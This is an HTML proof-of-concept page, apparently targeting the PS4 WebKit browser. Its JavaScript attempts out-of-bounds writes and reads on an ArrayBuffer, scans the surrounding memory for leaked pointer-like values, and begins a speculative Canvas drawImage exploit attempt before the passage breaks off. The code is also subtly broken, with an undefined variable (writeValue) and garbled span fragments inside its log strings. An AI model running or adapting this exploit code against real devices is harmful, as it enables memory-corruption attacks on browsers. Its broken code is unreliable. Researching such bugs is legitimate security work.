<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Leak Invest + Canvas Link</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; } /* Vermelho vivo */
        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks potenciais */
        .log-ptr { color: #f0f; font-weight: bold; }  /* Magenta para ponteiros potenciais */
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Investigação de Leak + Teste Canvas 2D</h1>
    <p>Foco: Investigar leak 0xAAAA..., adicionar teste Canvas especulativo via link.</p>
    <div id="controls">
         <span id="js-link-placeholder" style="color:orange; display: block; margin: 10px;">[Link para Teste Canvas será injetado aqui]</span>
    </div>
    <div id="poc-output"></div>
    <canvas id="exploit-canvas" width="10" height="10" style="border:1px solid #555; display: none;"></canvas> <script>
        let outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => { /* Função log igual anterior */
             if (!outputDiv) return; try { const t=`[${new Date().toLocaleTimeString()}]`; const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;"); if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000); outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;} outputDiv.innerHTML+=`<span class="log-<span class="math-inline">\{type\}"\></span>{t} ${s}\n</span>`; outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}
        };
        const PAUSE_DURATION = 300;

        // Heurística de Ponteiro Simples
        const isPotentialPointer64 = (high, low) => {
             if(high===null||low===null||typeof high!=='number'||typeof low!=='number')return false;
             if(high===0&&low===0)return false; // Ignora nulo
             if(high===0xFFFFFFFF&&low===0xFFFFFFFF)return false; // Ignora -1
             if(high===0xAAAAAAAA&&low===0xAAAAAAAA)return false; // Ignora padrão AAAA (vamos tratá-lo separadamente)
             // Heurística muito simples: High não zero ou Low muito grande sugere ponteiro/dado
             return high > 0 || low > 0xFFFF;
         };
        const toHex = (val, bits = 32) => { if(typeof val!=='number'||!isFinite(val))return'NaN/Invalid';let n=Number(val);if(bits<=32){n=n>>>0;}const p=Math.ceil(bits/4);return'0x'+n.toString(16).toUpperCase().padStart(p,'0');};


        // --- Funções de Teste ---

        // Teste 1: Investigação dos Leaks OOB @ Offsets 32, 52
        const runOOBInvestigateLeakOffsets = async () => {
            log("--- Iniciando Teste 1: Investigação Leak OOB @ Offsets 32, 52 ---", 'test');
            try {
                const bufferSize = 128; // Buffer maior para mais espaço OOB
                const buffer = new ArrayBuffer(bufferSize);
                const u8view = new Uint8Array(buffer);
                const dataView = new DataView(buffer);
                const testOffsetsBytes = [32, 52]; // Offsets em bytes *relativos ao fim do buffer* onde 0xAAAA... foi visto
                const writePattern = 0xBEEFCAFE; // Padrão de escrita 32-bit
                const writePatternBytes = [(writeValue >> 0) & 0xFF, (writeValue >> 8) & 0xFF, (writeValue >> 16) & 0xFF, (writeValue >> 24) & 0xFF];

                // Confirmar OOB Write básico primeiro
                log("Confirmando OOB Write básico @ -1...", 'subtest');
                try { u8view[-1] = 0xDD; log("OOB Write @ -1 OK.", 'good'); }
                catch (e) { log("FALHA OOB Write @ -1. Abortando Teste 1.", 'error'); return; }

                for (const leakOffset of testOffsetsBytes) {
                    const absoluteWriteReadOffset = bufferSize + leakOffset; // Onde vamos escrever/ler OOB
                    log(`Investigando offset OOB de ${leakOffset} bytes (Absoluto: ${absoluteWriteReadOffset})...`, 'subtest');

                    // A. Tentar Escrever e Verificar
                    log(` -> Testando ESCRITA OOB U32 no offset ${absoluteWriteReadOffset}...`, 'info');
                    let writeConfirmed = false;
                    try {
                        dataView.setUint32(absoluteWriteReadOffset, writePattern, true); // Escreve padrão
                        log("    Escrita OOB (setUint32) realizada sem erro.", 'warn');
                        // Ler de volta imediatamente
                        const readBack = dataView.getUint32(absoluteWriteReadOffset, true);
                        if (readBack === writePattern) {
                            log(`    VULN: Leitura pós-escrita confirmou o valor ${toHex(readBack)}! Controle de escrita OOB OK.`, 'vuln');
                            writeConfirmed = true;
                        } else {
                            log(`    AVISO: Leitura pós-escrita retornou ${toHex(readBack)}, diferente do esperado ${toHex(writePattern)}.`, 'warn');
                        }
                    } catch (e) {
                        log(`    ERRO/BLOQUEIO na escrita/leitura OOB U32 no offset ${absoluteWriteReadOffset}: ${e.message}`, 'good');
                    }

                    // B. Leitura Ampla ao Redor (se escrita funcionou ou queremos tentar mesmo assim)
                    log(` -> Testando LEITURA OOB ampla ao redor de ${absoluteWriteReadOffset}...`, 'info');
                    const readWindowBytes = 256; // Ler 128 bytes antes, 128 depois
                    const startReadOffset = absoluteWriteReadOffset - (readWindowBytes / 2);
                    let foundPotentialLeak = false;
                    for(let i = 0; i < readWindowBytes / 8; i++) { // Ler em blocos de 8 bytes
                        const currentByteOffset = startReadOffset + (i * 8);
                         try {
                             // Ler como U64 (simulado)
                             const low = dataView.getUint32(currentByteOffset, true);
                             const high = dataView.getUint32(currentByteOffset + 4, true);
                             const u64Str = `H=<span class="math-inline">\{toHex\(high\)\} L\=</span>{toHex(low)}`;

                             // Reportar qualquer coisa diferente de 0 ou AAAA... (se for o padrão esperado)
                             if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) {
                                 // Logar talvez o primeiro AAAA encontrado
                                 // log(`  Leak Padrão AAAA @Byte ${currentByteOffset}`, 'info');
                             } else if (high !== 0 || low !== 0) {
                                 log(`  Leak U64? @Byte ${currentByteOffset}: ${u64Str}`, 'leak');
                                 if (isPotentialPointer64(high, low)) {
                                     log(`    >> POTENCIAL PONTEIRO!`, 'ptr');
                                     foundPotentialLeak = true;
                                 }
                             }
                         } catch(e) {} // Ignorar erros de leitura fora dos limites "reais"
                    }
                     if (!foundPotentialLeak) { log("    Nenhum ponteiro/dado OOB suspeito encontrado na leitura ampla.", 'info'); }

                    await new Promise(resolve => setTimeout(resolve, 50));
                } // fim loop offsets

            } catch (e) { log(`Erro GERAL no teste OOB Investigate Leak: ${e.message}`, 'warn'); }
            log("--- Teste 1 Concluído ---", 'test');
        };

        // Teste 2: Teste Especulativo Canvas 2D (Chamado pelo Link)
        const attemptCanvasExploit = async () => {
             log("--- Iniciando Teste 2: Canvas 2D Exploit Attempt (Especulativo) ---", 'test');
             try {
                 const canvas = document.getElementById('exploit-canvas');
                 if (!canvas) { log("Canvas 'exploit-canvas' não encontrado.", 'error'); return; }
                 const ctx = canvas.getContext('2d');
                 if (!ctx) { log("Contexto 2D não obtido.", 'error'); return; }
                 log("Contexto Canvas 2D obtido.", 'info');

                 // Tentativa 1: Dimensões/Coordenadas Inválidas/Grandes
                 log("Tentando drawImage com valores extremos...", 'subtest');
                 try {
                     // Usar o próprio canvas como imagem fonte pode ser problemático
                     ctx.drawImage(canvas, -10000, -10000, 0xFFFFFFFF, 0xFFFFFFFF);
                     log("drawImage com valores extremos executado sem erro (?).", 'warn');
                 } catch (e) { log(`Erro
